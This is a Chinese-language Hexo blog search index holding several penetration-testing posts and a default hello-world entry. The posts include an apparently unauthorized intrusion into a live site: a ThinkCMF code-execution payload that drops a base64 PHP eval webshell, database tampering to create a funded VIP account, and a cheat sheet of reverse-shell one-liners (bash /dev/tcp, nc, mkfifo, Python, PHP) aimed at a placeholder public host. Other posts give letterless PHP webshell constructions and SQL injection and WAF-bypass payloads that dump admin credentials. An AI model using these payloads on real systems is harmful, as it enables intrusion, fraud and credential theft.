<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[纪录对黄站的一次渗透测试]]></title>
    <url>%2F2019%2F11%2F06%2FOne-the-yellow-penetration-test%2F</url>
    <content type="text"><![CDATA[该站点是本人同事分享给我的，本着技术学习的目的就对这个站点进行了一下简单的测试。 渗透流程确定目标站点http://156.236.127.158/ 对站点进行目录爆破这里我使用的是御剑和dirsearch-master、该过程中没有发现什么特别的东西，就发现了一个phpinfo页面和一个后台地址。 简单的过了一下没有发现什么可用的数据。那只有硬着头皮去看主体内容有没有可挖掘的东西。 开始渗透注册用户进行渗透注册用户，想看看用户是否有可上传文件的地方（比如上传头像），注册成功后发现并没有，个人信息处只有一个修改登录密码的功能。然后想着是否可以越权修改他人密码比如管理员的。抓包全面检查了一下参数，发现并没有明显的逻辑漏洞。这里因为站长老哥把站给关了，操作过程中没有截图，所以就不放了。 对后台地址进行渗透发现前台登录没有明显的可利用漏洞，于是联想到之前爆目录爆出来的后台地址，精神又大振，尝试了一下admin登录，系统提示密码错误。神经瞬间亢奋，习惯性的进行了一波注入测试，发现并不存在。抓包看了一下响应包，发现不存在明显的逻辑特征。 这里因为站长老哥把站给关了，操作过程中没有截图，所以就不放了。 对主体内容进行渗透经过对流量的抓包和回放测试，发现了一个SQL注入漏洞，习惯性的丢到sqlmap里面去跑。 但sqlmap似乎测试不出这是什么数据库，估计是过滤了一些关键字眼。本来是想着手注一下的，然后无意输入了一个错误路径，报错信息令我神经振奋。这居然是一个thinkcms的站，啥也不说payload走起。 1/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php&gt;file_put_contents('info.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbJ2FiYyddKTs/Pg=='))&lt;/php&gt; 这里shell文件是上传到根目录的，访问一波文件存在且解析成功，直接菜刀连接。 进行dos命令发现不成功，估计站点老哥做了一些安全限制。 无奈只有去找其他的可用信息，查找了一下站点的配置信息，发现了数据库的配置信息。 这里直接上传一波大马（其实没必要），只是想满足一下自己。 连接数据库，找到VIP用户对应的表，新建了一个拥有几万块钱的用户的账户，随手就开了一个永久VIP，刺激。 这里最刺激的是可以提现，但是作为良好公民的我，哪怕是非法站点我也是不会对它薅羊毛的。最后看了一下，简单的尝试了一下nc反弹shell，shell是成功反弹了，但是命令似乎依旧无法执行，算了，目的已经达到就点到为止了。 后渗透几天过后，想了想，还是觉得前面做的太浅了。于是想回去对流量做一个转发，进行一下后渗透。结果发现站长老哥发现异常了，把站给关了。 没有办法，只好到此为止。 总结常见shell反弹总结可以根据服务器上面存在的进行利用。 1whereis bash nc php python ecex 可以采用上述方式进行查看。 123bash -i &gt;&amp; /dev/tcp/公网主机IP/端口 0&gt;&amp;1/bin/bash -i &gt;&amp; /dev/tcp/公网主机IP/端口 0&gt;&amp;1/bin/sh -i &gt;&amp; /dev/tcp/公网主机IP/端口 0&gt;&amp;1 这里简单解释一下:bash -i 打开一个交互的bash,&gt;&amp; 将标准错误输出重定向到标准输出/dev/tcp/x.x.x.x/port 意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口 0&gt;&amp;1 标准输入重定向到标准输出，实现你与反弹出来的shell的交互。 用bash反弹 12nc -e /bin/bash 公网主机IP 端口rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 公网主机IP 端口 &gt;/tmp/f 用python反弹 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("公网主机IP",端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 用php反弹 1php -r '$sock=fsockopen("公网主机IP",端口);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' 用exec反弹 10&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;your_vps&gt;/1024; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 渗透总结拿下站后，不能把动静弄的太大，不要小瞧开发老哥。然后就是不要干违法的事，谢谢！ 推荐阅读https://www.freebuf.com/vuls/211842.htmlhttps://www.freebuf.com/vuls/211847.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[没有数字和字母的webshell思考]]></title>
    <url>%2F2019%2F09%2F02%2FOne-Test-Bypass-webshell%2F</url>
    <content type="text"><![CDATA[看了p牛大佬的一些不包含数字和字母的webshell文章后，觉得思路很骚，就想着自己尝试一波学习学习。 搭建环境1.centos72.php5.4.16+mysql3.准备一段过滤了字母和数字的php代码 12345&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123; eval($_GET['shell']);&#125;?&gt; 分析思路既然过滤了字母和数字，那么思路很清晰，就是将非字母、数字的字符经过各种变换，最终构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接出一个函数名，如“assert”，然后动态执行就ojbk啦。 那么如何变换呢？ 这里有一点要提的，本文用到的assert对于php5和php7是不一样的。php5中assert是一个函数，我们可以通过$S_=’assert’;$S_(…);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。不过道路千千万，php的函数调用还是很多的，比如file_put_contents函数，同样可以用来getshell。 方法一采用异或方式，在PHP中2个字符异或时，默认会将2个字符的ascii码进行异或。这里就可以使用2个非字母、数字的字符异或从而得到想要的字母。（不可打印字符的url编码为%十六进制）分析原理SOH标题开始符–%01二进制–00000001斜引号--%60 二进制--01100000 (&#39;%01&#39;^&#39;‘)–01100001a–%61二进制–01100001即(‘%01’^’&#39;)--&gt;a 同理： (&#39;%13&#39;^&#39;‘)–01110011–&gt;s(‘%05’^’&#39;)--&gt;e (&#39;%12&#39;^&#39;‘)–&gt;r(‘%14’^’`’)–&gt;t 开始构造payload 1234$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');//$_='assert';$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');//$__='_POST';$___=$$__;//$___='$_POST';$_($___[_]);//assert(S_POST[_]); 执行结果： 方法二采用取反方式，这里主要是通过将汉字的某个字符取出来，然后取反从而得到我们想要的字母。例如： ord(‘瞰’[1])–&gt;158二进制–&gt;10011110取反–&gt;01100001–&gt;97–&gt;a同理：‘和’[2]–&gt;s‘的’[1]–&gt;e‘半’[1]–&gt;r‘始’[2]–&gt;t‘俯’[2]–&gt;P‘瞰’[2]–&gt;O‘次’[1]–&gt;S‘站’[1]–&gt;T 开始构造payload 1234567$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');//$__=2;$_=$__/$__;//$_=1;$___=(~('瞰'[$_])).(~('和'[$__])).(~('和'[$__])).(~('的'[$_])).(~('半'[$_])).(~('始'[$__]));//$___='assert';$____='_'.(~('俯'[$__])).(~('瞰'[$__])).(~('次'[$_])).(~('站'[$_]));//$____='_POST';$_=$$____;//$_='$_POST';$___($_[_]);//assert($_POST[_]); 参考了一下p牛大佬的。换种构造方式–&gt;$a=’瞰’;~($a{1});重新构造payload 12345678$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$__/$__;$____='';$___="瞰";$____.=~($___&#123;$_&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="的";$____.=~($___&#123;$_&#125;);$___="半";$____.=~($___&#123;$_&#125;);$___="始";$____.=~($___&#123;$__&#125;);$_____='_';$___="俯";$_____.=~($___&#123;$__&#125;);$___="瞰";$_____.=~($___&#123;$__&#125;);$___="次";$_____.=~($___&#123;$_&#125;);$___="站";$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[_]); 这里还用到了php的弱类型，因为在构造payload的过程中需要使用到1，2。而在php中true=1，因此true+true=2，所以构造2条true语句即可。即：(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)==2 方法三这里用到了php的一个特性，即得到一个字母通过自增来获取其他的字母。例如：既然如此，我们就只需要得到字母a，那从那里获取呢？我们发现数组（Array）里面就有我们需要的a。而在php中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array。例如：因为php函数对大小写不敏感，所以取A就可以啦。 开始构造payload 12345678910111213141516171819202122232425262728293031323334$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); 总结这里不知道是什么原因，导致第二种和第三种方法复现不成功。用php校验了一下函数都构造的是正确的，猜测可能是构造请求payload的时候有些换行或者中间的注释符没有清除干净导致的错误。 推荐阅读：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.htmlhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[纪录一次完整的access注入]]></title>
    <url>%2F2019%2F07%2F25%2Fthe-first-accessInjection%2F</url>
    <content type="text"><![CDATA[目标站点：https://www.xxx.com/注入点：https://www.xxx.com/common.asp?id=27 判断注入点1id=27' 1id=27+and+1=1 1id=27+and+1=0 确定这是一个注入点。 判断数据库123id=27+and+(select+count(*)+from+msysobjects)&gt;0 返回正常，则为mssql不正常，为access 确定数据库为access数据库 开始注入order by爆字段1id=27+order+by+7%00 1id=27+order+by+8%00 确定字段是7。 猜表名1id=27+and+exists(select+*+from+admin)%00 经过多次尝试（这里可以爆破）。 1id=27+and+exists(select+*+from+admin_user)%00 猜测出admin_user表。 猜列名1id=27+and+exists(select+id+from+admin_user)%00 存在id列 1id=27+and+exists(select+username+from+admin_user)%00 不存在username，多次尝试（可爆破）。得出至少有id、admin、password三列。 爆用户名，密码1id=27+union+select+1,2,3,4,5,6,7+from+admin_user%00 确定可显字段是2,3。 1id=27+union+select+1,admin,password,4,5,6,7+from+admin_user%00 最终得出账户admin以及密码（MD5解密）。]]></content>
  </entry>
  <entry>
    <title><![CDATA[纪录项目中一次简单的SQL注入bypass]]></title>
    <url>%2F2019%2F07%2F12%2Fjob-first-bypass%2F</url>
    <content type="text"><![CDATA[这篇文章是本人在项目中遇到的一个sql注入bypass的纪录。 目标站点：https://www.xxx.com/注入点：https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;classid=884 判断注入点1newsid=28671'&amp;classid=884 进一步判断 123'and 1=1 //报错'and 1='1 //不报错'and '1'='1 //不报错 最终确定了这是一个注入点 获取信息按照常规的思路，准备先order by爆一下字段，然后在逐步爆库、表以及用户信息。 常规思路注入先手order by 123'order by 10--+ //Unknown column '10' in 'order clause'1054'order by 2--+ //Unknown column '2' in 'order clause'1054'order by 1--+ //成功 说明只有1个字段，继续进行。 123'union select user()--+ //拦截'union--+ //不拦截'union user()--+ //不拦截 这里猜测拦截了select 12345'union /*!select*/ user()--+ //拦截'union sElect user()--+ //拦截'union sel%0aect user()--+ //不拦截，但是报错'union sel%0aect user()--+ //不拦截，但是报错'union sel/**/ect user()--+ //不拦截，但是报错 emmmmm，到这里我已经绝望了，不得不说这后端处理写的对于我这种新手来说是真的凶残。自顾自的看了一会注入的文章，忽然发现可以采用updatexml报错注入，立刻又开始。 稍稍普及一下updatexml报错注入 12345UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 官方的东西可能说的不太接地气，直接操作一波大家就知道有什么作用了。大概就是concat将datbase(),user()等返回信息字符串化，然后因为updatexml的第二个参数需要Xpath格式的字符串,所以不符合要求，返回报错信息。 updatexml报错注入获取当前用户1234567'and updatexml(1,concat(0x3a,(select user())),1) //被拦截'and updatexml() //不拦截'and updatexml(1,concat(),1)//拦截'and updatexml(1,con%a0cat(),1)//不拦截，但是报错'and updatexml(1,con%00cat(),1)// 不拦截，但是报错'and updatexml(1,con%0acat(),1) // 不拦截，但是报错'and updatexml(1,/*!concat*/(),1)//不拦截，不报错 通过以上步骤推论waf拦截concant()函数，继续进行。 123'and updatexml(1,/*!concat*/(0x3a,(select user())),1)//拦截'and updatexml(1,/*!concat*/(0x3a,(select)),1)//拦截'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) // 不拦截 通过以上步骤推论waf还拦截了select，继续进行。 1234'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1)--+ //发现页面不响应'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) and '//拦截'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) /*!and*/ ' 成功'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1)--+//成功 获取当前数据库1'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ database())),1)--+ 获取到当前数据库和用户后，继续按照常规思路，爆库、爆表、爆字段。 爆库、爆表、爆字段123'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from information_schema.schemata limit 0,1)),1)--+ //拦截'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from /*!information_schema.schemata*/ limit 0,1)),1)--+//拦截'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/schema_name from /*!information0x5fschema.schemata*/ limit 0,1)),1)--+ //成功 虽然执行成功，但似乎限制了权限。思考了很久，正准备放弃的时候，同站点另外一个注入点吸引了我。 这里报错直接把sql语句给提示出来了，刚刚好有我们需要的表信息，二话不说，进一步尝试。 直接按照之前bypass的特点，一步到位。 1' and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ username from phome_enewsuser limit 0,1)),1)--+&amp;classid=834 1' and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ password from phome_enewsuser limit 0,1)),1)--+&amp;classid=834 总结 任何时候都不要放弃尝试，说不定试着试着就出来了。 推荐阅读：我的WafBypass之道（SQL注入篇）http://www.moonsec.com/post-299.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F07%2F09%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
